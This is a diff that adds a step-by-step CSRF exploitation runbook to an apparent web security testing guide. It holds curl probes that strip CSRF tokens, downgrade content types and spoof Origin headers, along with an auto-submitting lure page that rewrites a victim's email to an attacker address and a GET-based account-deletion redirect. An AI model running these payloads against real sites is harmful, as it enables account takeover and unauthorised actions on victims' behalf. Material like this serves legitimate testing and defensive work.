@@ -153,6 +153,121 @@ Cross-site request forgery abuses ambient authority (cookies, HTTP auth) across 
 - CSRF + Clickjacking: guide user interactions to bypass UI confirmations
 - CSRF + OAuth mix-up: bind victim sessions to unintended clients
 
+## Operational Runbook
+
+Once a state-changing endpoint is identified, this is the canonical CSRF confirmation flow. Two pieces are needed: a working request (with valid session) and a cross-origin probe that replays it without the protections.
+
+### Step 1 — capture the legitimate request
+
+Use proxy / DevTools to grab the real POST/PUT/PATCH/DELETE:
+
+```bash
+# Baseline — confirm the action works with valid session
+curl -i -X POST '<TARGET>/api/email-update' \
+    -H "Cookie: session=$SESSION" \
+    -H "Content-Type: application/json" \
+    -d '{"new_email":"baseline@x"}'
+# Expect: 2xx + state change confirmed
+```
+
+Note the headers the request *sends*. Pay attention to:
+- `Cookie` (the session — auto-sent cross-origin)
+- `Content-Type` (does it permit text/plain, application/x-www-form-urlencoded, multipart/form-data?)
+- `X-CSRF-Token` / `X-XSRF-TOKEN` / custom header (the CSRF token — if present, this is the protection)
+- `Origin` / `Referer` (often checked as a fallback)
+
+### Step 2 — strip the CSRF token, replay
+
+```bash
+# Same request, no X-CSRF-Token header
+curl -i -X POST '<TARGET>/api/email-update' \
+    -H "Cookie: session=$SESSION" \
+    -H "Content-Type: application/json" \
+    -d '{"new_email":"strip-test@x"}'
+# If 2xx → server doesn't enforce the token. Confirmed CSRF.
+# If 403 → token is enforced; move to next bypass.
+```
+
+### Step 3 — Content-Type downgrade
+
+Browsers can issue `text/plain` or `application/x-www-form-urlencoded` cross-origin without preflight. If the server accepts these for a JSON endpoint, it's CSRF-able:
+
+```bash
+# Try text/plain (no preflight required)
+curl -i -X POST '<TARGET>/api/email-update' \
+    -H "Cookie: session=$SESSION" \
+    -H "Content-Type: text/plain" \
+    --data-raw '{"new_email":"ct-plain@x"}'
+
+# Try urlencoded
+curl -i -X POST '<TARGET>/api/email-update' \
+    -H "Cookie: session=$SESSION" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "new_email=ct-form@x"
+```
+
+If either succeeds → cross-origin replay works. CSRF confirmed.
+
+### Step 4 — Origin / Referer bypass attempts
+
+```bash
+# Strip Origin and Referer
+curl -i -X POST '<TARGET>/api/email-update' \
+    -H "Cookie: session=$SESSION" \
+    -H "Content-Type: application/json" \
+    -H "Origin: " -H "Referer: " \
+    -d '{"new_email":"strip-orig@x"}'
+
+# Try null Origin (sandboxed iframe / data: URL)
+curl -i -X POST '<TARGET>/api/email-update' \
+    -H "Cookie: session=$SESSION" \
+    -H "Origin: null" \
+    -d '...'
+
+# Try attacker-controlled subdomain (regex bypass)
+curl -i -X POST '<TARGET>/api/email-update' \
+    -H "Cookie: session=$SESSION" \
+    -H "Origin: https://target.com.evil.com" \
+    -d '...'
+```
+
+### Step 5 — build the cross-origin PoC HTML
+
+```html
+<!-- attacker-controlled page; victim must visit while logged in -->
+<!DOCTYPE html>
+<html><body>
+  <h1>You won a prize! Click below.</h1>
+  <form id="csrf" action="https://target.com/api/email-update"
+        method="POST" enctype="text/plain">
+    <input name='{"new_email":"attacker' value='@evil.com"}'>
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
+</body></html>
+```
+
+**Critical attention**: the `enctype="text/plain"` trick puts the JSON body into the form field name/value pair so the resulting POST body is `{"new_email":"attacker=@evil.com"}` — which the server's loose JSON parser accepts.
+
+### Step 6 — SameSite-cookie escape hatch
+
+Modern browsers set `SameSite=Lax` by default — only top-level GET navigation sends the cookie cross-origin. Try:
+
+```html
+<!-- Top-level GET via window.location -->
+<script>window.location='https://target.com/api/delete-account?confirm=yes'</script>
+```
+
+Many state-changing flows still expose GET routes for "convenience" → SameSite=Lax doesn't protect them.
+
+### Step 7 — record evidence
+
+Document:
+- Baseline request (with all protections) — succeeded
+- Stripped-token request — succeeded/failed (which?)
+- Cross-origin HTML PoC — provide minimal reproducer
+- Browser tested (Chrome / Firefox; SameSite handling differs)
+- Pivot to impact: account takeover via email update, fund transfer, role grant, etc.
+
 ## Testing Methodology
 
 1. **Inventory endpoints** - All state-changing endpoints including admin/staff
